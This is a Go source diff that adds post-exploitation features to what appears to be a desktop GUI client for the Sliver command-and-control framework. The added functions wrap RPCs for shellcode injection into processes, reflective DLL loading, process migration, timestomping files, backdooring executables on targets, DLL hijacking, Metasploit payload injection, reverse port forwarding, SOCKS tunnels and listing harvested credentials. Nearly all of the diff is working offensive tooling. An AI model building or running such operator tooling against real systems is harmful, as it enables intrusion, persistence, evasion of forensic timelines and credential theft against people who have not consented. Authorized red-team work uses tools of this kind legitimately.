@@ -1016,6 +1016,561 @@ func (a *App) DownloadFileTo(sessionID, remotePath, localPath string) TransferRe
 	return TransferResult{Path: localPath, Bytes: int64(len(data))}
 }
 
+// ─── Advanced execution / privilege (session) ───────────────────────────────────
+
+// RunAs runs a program as another user (Windows).
+func (a *App) RunAs(sessionID, username, domain, password, program, args string) (string, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return "", err
+	}
+	resp, err := client.RPC.RunAs(a.ctx, &sliverpb.RunAsReq{
+		Username:    username,
+		Domain:      domain,
+		Password:    password,
+		ProcessName: program,
+		Args:        args,
+		Request:     &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return "", err
+	}
+	return resp.Output, nil
+}
+
+// Migrate injects the implant into another process (pid), building the payload
+// from a saved implant profile's config.
+func (a *App) Migrate(sessionID string, pid uint32, profileName string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	cfg, err := a.profileConfig(profileName)
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.Migrate(a.ctx, &clientpb.MigrateReq{
+		Pid:     pid,
+		Config:  cfg,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// profileConfig fetches a saved implant profile's config by name.
+func (a *App) profileConfig(name string) (*clientpb.ImplantConfig, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	profiles, err := client.RPC.ImplantProfiles(a.ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil, err
+	}
+	for _, p := range profiles.Profiles {
+		if p.Name == name {
+			if p.Config == nil {
+				return nil, fmt.Errorf("profile %q has no config", name)
+			}
+			// getsystem/migrate inject SHELLCODE into a process, so rebuild a
+			// fresh, complete config from the profile's core params with the
+			// format forced to shellcode. This avoids stale/partial fields from
+			// the DB round-trip that can produce invalid generated source.
+			req := GenerateRequest{
+				GOOS:   p.Config.GOOS,
+				GOARCH: p.Config.GOARCH,
+				Format: "shellcode",
+				Debug:  p.Config.Debug,
+			}
+			if len(p.Config.C2) > 0 {
+				req.C2URL = p.Config.C2[0].URL
+			}
+			if req.C2URL == "" {
+				return nil, fmt.Errorf("profile %q has no C2 URL", name)
+			}
+			return a.buildImplantConfig(req), nil
+		}
+	}
+	return nil, fmt.Errorf("implant profile %q not found — create one in the Profiles panel first", name)
+}
+
+// ExecuteShellcode injects shellcode (opened via a native dialog) into a process.
+// pid 0 = the implant's own process.
+func (a *App) ExecuteShellcode(sessionID, localPath string, pid uint32) AssemblyResult {
+	client, err := a.requireClient()
+	if err != nil {
+		return AssemblyResult{Error: err.Error()}
+	}
+	data, err := a.readLocalOrDialog(localPath, "Select shellcode (.bin)")
+	if err != nil {
+		return AssemblyResult{Error: err.Error()}
+	}
+	_, err = client.RPC.Task(a.ctx, &sliverpb.TaskReq{
+		Data:     data,
+		Pid:      pid,
+		RWXPages: true,
+		Request:  &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return AssemblyResult{Error: err.Error()}
+	}
+	return AssemblyResult{Output: "[+] shellcode injected"}
+}
+
+// SpawnDll reflectively loads a DLL (opened via a native dialog) into a process.
+func (a *App) SpawnDll(sessionID, localPath, args, entryPoint string) AssemblyResult {
+	client, err := a.requireClient()
+	if err != nil {
+		return AssemblyResult{Error: err.Error()}
+	}
+	data, err := a.readLocalOrDialog(localPath, "Select reflective DLL")
+	if err != nil {
+		return AssemblyResult{Error: err.Error()}
+	}
+	ep := entryPoint
+	if ep == "" {
+		ep = "ReflectiveLoader"
+	}
+	_, err = client.RPC.SpawnDll(a.ctx, &sliverpb.InvokeSpawnDllReq{
+		Data:        data,
+		ProcessName: "notepad.exe",
+		Args:        strings.Fields(args),
+		EntryPoint:  ep,
+		Request:     &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return AssemblyResult{Error: err.Error()}
+	}
+	return AssemblyResult{Output: "[+] DLL spawned"}
+}
+
+func (a *App) Chmod(sessionID, path, mode string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.Chmod(a.ctx, &sliverpb.ChmodReq{
+		Path:     path,
+		FileMode: mode,
+		Request:  &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+func (a *App) Chown(sessionID, path, uid, gid string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.Chown(a.ctx, &sliverpb.ChownReq{
+		Path:    path,
+		Uid:     uid,
+		Gid:     gid,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// Chtimes timestomps a file — sets access + modified time (unix seconds).
+func (a *App) Chtimes(sessionID, path string, atime, mtime int64) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.Chtimes(a.ctx, &sliverpb.ChtimesReq{
+		Path:    path,
+		ATime:   atime,
+		MTime:   mtime,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// ─── Reverse port forwarding (session) ──────────────────────────────────────────
+
+type RportFwdView struct {
+	ID      uint32 `json:"id"`
+	Bind    string `json:"bind"`
+	Forward string `json:"forward"`
+}
+
+func (a *App) StartRportFwd(sessionID, bindAddr string, bindPort int, fwdAddr string, fwdPort int) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.StartRportFwdListener(a.ctx, &sliverpb.RportFwdStartListenerReq{
+		BindAddress:    bindAddr,
+		BindPort:       uint32(bindPort),
+		ForwardAddress: fwdAddr,
+		ForwardPort:    uint32(fwdPort),
+		Request:        &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+func (a *App) ListRportFwds(sessionID string) ([]RportFwdView, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	resp, err := client.RPC.GetRportFwdListeners(a.ctx, &sliverpb.RportFwdListenersReq{
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return nil, err
+	}
+	out := make([]RportFwdView, 0, len(resp.Listeners))
+	for _, l := range resp.Listeners {
+		out = append(out, RportFwdView{
+			ID:      l.ID,
+			Bind:    fmt.Sprintf("%s:%d", l.BindAddress, l.BindPort),
+			Forward: fmt.Sprintf("%s:%d", l.ForwardAddress, l.ForwardPort),
+		})
+	}
+	return out, nil
+}
+
+func (a *App) StopRportFwd(sessionID string, id uint32) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.StopRportFwdListener(a.ctx, &sliverpb.RportFwdStopListenerReq{
+		ID:      id,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// ReconfigureBeacon changes a live beacon's check-in interval/jitter (seconds).
+// Applied on the beacon's next check-in.
+func (a *App) ReconfigureBeacon(beaconID string, interval, jitter int64) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.Reconfigure(a.ctx, &sliverpb.ReconfigureReq{
+		BeaconInterval: interval * int64(time.Second),
+		BeaconJitter:   jitter * int64(time.Second),
+		Request:        &commonpb.Request{BeaconID: beaconID, Async: true},
+	})
+	return err
+}
+
+// InteractiveBeacon asks a beacon to open an interactive session on next check-in.
+func (a *App) InteractiveBeacon(beaconID string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.OpenSession(a.ctx, &sliverpb.OpenSession{
+		Request: &commonpb.Request{BeaconID: beaconID, Async: true},
+	})
+	return err
+}
+
+// ─── Regenerate / Hosts / Creds (server) ────────────────────────────────────────
+
+// RegenerateBuild re-downloads a previously built implant by name and saves it.
+func (a *App) RegenerateBuild(name string) TransferResult {
+	client, err := a.requireClient()
+	if err != nil {
+		return TransferResult{Error: err.Error()}
+	}
+	resp, err := client.RPC.Regenerate(a.ctx, &clientpb.RegenerateReq{ImplantName: name})
+	if err != nil {
+		return TransferResult{Error: err.Error()}
+	}
+	if resp.File == nil {
+		return TransferResult{Error: "no stored build for " + name}
+	}
+	savePath, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
+		DefaultFilename: resp.File.Name,
+		Title:           "Save regenerated implant",
+	})
+	if err != nil || savePath == "" {
+		return TransferResult{Error: "save cancelled"}
+	}
+	if err := os.WriteFile(savePath, resp.File.Data, 0755); err != nil {
+		return TransferResult{Error: err.Error()}
+	}
+	return TransferResult{Path: savePath, Bytes: int64(len(resp.File.Data))}
+}
+
+type HostView struct {
+	ID        string `json:"id"`
+	Hostname  string `json:"hostname"`
+	OS        string `json:"os"`
+	UUID      string `json:"uuid"`
+	Locale    string `json:"locale"`
+	FirstSeen string `json:"firstSeen"`
+}
+
+func (a *App) ListHosts() ([]HostView, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	resp, err := client.RPC.Hosts(a.ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil, err
+	}
+	out := make([]HostView, 0, len(resp.Hosts))
+	for _, h := range resp.Hosts {
+		fs := ""
+		if h.FirstContact > 0 {
+			fs = time.Unix(h.FirstContact, 0).Format("2006-01-02 15:04")
+		}
+		out = append(out, HostView{ID: h.ID, Hostname: h.Hostname, OS: h.OSVersion, UUID: h.HostUUID, Locale: h.Locale, FirstSeen: fs})
+	}
+	return out, nil
+}
+
+func (a *App) DeleteHost(hostID string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.HostRm(a.ctx, &clientpb.Host{ID: hostID})
+	return err
+}
+
+type CredView struct {
+	ID       string `json:"id"`
+	Username string `json:"username"`
+	Plain    string `json:"plaintext"`
+	Hash     string `json:"hash"`
+	Cracked  bool   `json:"cracked"`
+}
+
+func (a *App) ListCreds() ([]CredView, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	resp, err := client.RPC.Creds(a.ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil, err
+	}
+	out := make([]CredView, 0, len(resp.Credentials))
+	for _, c := range resp.Credentials {
+		out = append(out, CredView{ID: c.ID, Username: c.Username, Plain: c.Plaintext, Hash: c.Hash, Cracked: c.IsCracked})
+	}
+	return out, nil
+}
+
+func (a *App) AddCred(username, plaintext, hash string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.CredsAdd(a.ctx, &clientpb.Credentials{
+		Credentials: []*clientpb.Credential{{Username: username, Plaintext: plaintext, Hash: hash}},
+	})
+	return err
+}
+
+func (a *App) DeleteCred(id string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.CredsRm(a.ctx, &clientpb.Credentials{
+		Credentials: []*clientpb.Credential{{ID: id}},
+	})
+	return err
+}
+
+// ─── Websites / Canaries (server) ───────────────────────────────────────────────
+
+type WebsiteView struct {
+	ID    string `json:"id"`
+	Name  string `json:"name"`
+	Paths int    `json:"paths"`
+}
+
+func (a *App) ListWebsites() ([]WebsiteView, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	resp, err := client.RPC.Websites(a.ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil, err
+	}
+	out := make([]WebsiteView, 0, len(resp.Websites))
+	for _, w := range resp.Websites {
+		out = append(out, WebsiteView{ID: w.ID, Name: w.Name, Paths: len(w.Contents)})
+	}
+	return out, nil
+}
+
+func (a *App) RemoveWebsite(name string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.WebsiteRemove(a.ctx, &clientpb.Website{Name: name})
+	return err
+}
+
+type CanaryView struct {
+	Domain      string `json:"domain"`
+	ImplantName string `json:"implantName"`
+	Triggered   bool   `json:"triggered"`
+	Count       uint32 `json:"count"`
+	Latest      string `json:"latest"`
+}
+
+func (a *App) ListCanaries() ([]CanaryView, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	resp, err := client.RPC.Canaries(a.ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil, err
+	}
+	out := make([]CanaryView, 0, len(resp.Canaries))
+	for _, c := range resp.Canaries {
+		out = append(out, CanaryView{Domain: c.Domain, ImplantName: c.ImplantName, Triggered: c.Triggered, Count: c.Count, Latest: c.LatestTrigger})
+	}
+	return out, nil
+}
+
+// StartStagerListener starts a TCP stager listener that serves a stage built
+// from a saved implant profile.
+func (a *App) StartStagerListener(host string, port uint32, profileName string) (uint32, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return 0, err
+	}
+	resp, err := client.RPC.StartTCPStagerListener(a.ctx, &clientpb.StagerListenerReq{
+		Host:        host,
+		Port:        port,
+		ProfileName: profileName,
+	})
+	if err != nil {
+		return 0, err
+	}
+	return resp.JobID, nil
+}
+
+// ─── Post-exploitation: backdoor / dllhijack / msf (session) ─────────────────────
+
+// Backdoor injects an implant (from a profile) into an existing PE on the target.
+func (a *App) Backdoor(sessionID, remoteFilePath, profileName string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.Backdoor(a.ctx, &clientpb.BackdoorReq{
+		FilePath:    remoteFilePath,
+		ProfileName: profileName,
+		Request:     &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// DllHijack plants a hijacking DLL at TargetLocation, cloning exports from a
+// reference DLL and embedding an implant (from a profile).
+func (a *App) DllHijack(sessionID, referenceDLLPath, targetLocation, profileName string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.HijackDLL(a.ctx, &clientpb.DllHijackReq{
+		ReferenceDLLPath: referenceDLLPath,
+		TargetLocation:   targetLocation,
+		ProfileName:      profileName,
+		Request:          &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// MsfInject runs a Metasploit payload in the session's own process.
+func (a *App) MsfInject(sessionID, payload, lhost string, lport uint32) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.Msf(a.ctx, &clientpb.MSFReq{
+		Payload: payload,
+		LHost:   lhost,
+		LPort:   lport,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// MsfRemoteInject runs a Metasploit payload injected into another process (pid).
+func (a *App) MsfRemoteInject(sessionID, payload, lhost string, lport, pid uint32) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.MsfRemote(a.ctx, &clientpb.MSFRemoteReq{
+		Payload: payload,
+		LHost:   lhost,
+		LPort:   lport,
+		PID:     pid,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+// ─── WireGuard tunneling (session, WG implants) ─────────────────────────────────
+
+func (a *App) WGStartPortForward(sessionID string, localPort int, remoteAddr string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.WGStartPortForward(a.ctx, &sliverpb.WGPortForwardStartReq{
+		LocalPort:     int32(localPort),
+		RemoteAddress: remoteAddr,
+		Request:       &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+func (a *App) WGStopPortForward(sessionID string, id int) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.WGStopPortForward(a.ctx, &sliverpb.WGPortForwardStopReq{
+		ID:      int32(id),
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+func (a *App) WGStartSocks(sessionID string, port int) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.WGStartSocks(a.ctx, &sliverpb.WGSocksStartReq{
+		Port:    int32(port),
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
+func (a *App) WGStopSocks(sessionID string, id int) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	_, err = client.RPC.WGStopSocks(a.ctx, &sliverpb.WGSocksStopReq{
+		ID:      int32(id),
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	return err
+}
+
 // ─── Loot ────────────────────────────────────────────────────────────────────
 
 type LootView struct {
@@ -1932,19 +2487,9 @@ func (a *App) GetSystem(sessionID, hostingProcess, profileName string) error {
 	if err != nil {
 		return err
 	}
-	profiles, err := client.RPC.ImplantProfiles(a.ctx, &commonpb.Empty{})
+	cfg, err := a.profileConfig(profileName)
 	if err != nil {
 		return err
-	}
-	var cfg *clientpb.ImplantConfig
-	for _, p := range profiles.Profiles {
-		if p.Name == profileName {
-			cfg = p.Config
-			break
-		}
-	}
-	if cfg == nil {
-		return fmt.Errorf("implant profile %q not found — create one in the Profiles panel first", profileName)
 	}
 	if hostingProcess == "" {
 		hostingProcess = "spoolsv.exe"
@@ -1966,19 +2511,30 @@ type AssemblyResult struct {
 
 // ExecuteAssembly runs a .NET assembly in-memory. Opens a native file picker for
 // the assembly bytes.
-func (a *App) ExecuteAssembly(sessionID, args string) AssemblyResult {
+// readLocalOrDialog reads a local file on the operator machine. If localPath is
+// empty it opens a native file-open dialog instead. Lets console commands pass
+// an explicit path (execute-assembly <path>) or fall back to a picker.
+func (a *App) readLocalOrDialog(localPath, title string) ([]byte, error) {
+	if localPath == "" {
+		p, err := runtime.OpenFileDialog(a.ctx, runtime.OpenDialogOptions{Title: title})
+		if err != nil || p == "" {
+			return nil, fmt.Errorf("selection cancelled")
+		}
+		localPath = p
+	}
+	data, err := os.ReadFile(localPath)
+	if err != nil {
+		return nil, fmt.Errorf("read local file: %w", err)
+	}
+	return data, nil
+}
+
+func (a *App) ExecuteAssembly(sessionID, localPath, args string) AssemblyResult {
 	client, err := a.requireClient()
 	if err != nil {
 		return AssemblyResult{Error: err.Error()}
 	}
-	localPath, err := runtime.OpenFileDialog(a.ctx, runtime.OpenDialogOptions{
-		Title:   "Select .NET assembly (.exe)",
-		Filters: []runtime.FileFilter{{DisplayName: ".NET assembly (*.exe)", Pattern: "*.exe"}},
-	})
-	if err != nil || localPath == "" {
-		return AssemblyResult{Error: "selection cancelled"}
-	}
-	data, err := os.ReadFile(localPath)
+	data, err := a.readLocalOrDialog(localPath, "Select .NET assembly (.exe)")
 	if err != nil {
 		return AssemblyResult{Error: err.Error()}
 	}
@@ -1995,18 +2551,12 @@ func (a *App) ExecuteAssembly(sessionID, args string) AssemblyResult {
 }
 
 // Sideload loads and runs a shared library / DLL in a sacrificial process.
-func (a *App) Sideload(sessionID, args, entryPoint string) AssemblyResult {
+func (a *App) Sideload(sessionID, localPath, args, entryPoint string) AssemblyResult {
 	client, err := a.requireClient()
 	if err != nil {
 		return AssemblyResult{Error: err.Error()}
 	}
-	localPath, err := runtime.OpenFileDialog(a.ctx, runtime.OpenDialogOptions{
-		Title: "Select DLL / shared library to sideload",
-	})
-	if err != nil || localPath == "" {
-		return AssemblyResult{Error: "selection cancelled"}
-	}
-	data, err := os.ReadFile(localPath)
+	data, err := a.readLocalOrDialog(localPath, "Select DLL / shared library to sideload")
 	if err != nil {
 		return AssemblyResult{Error: err.Error()}
 	}
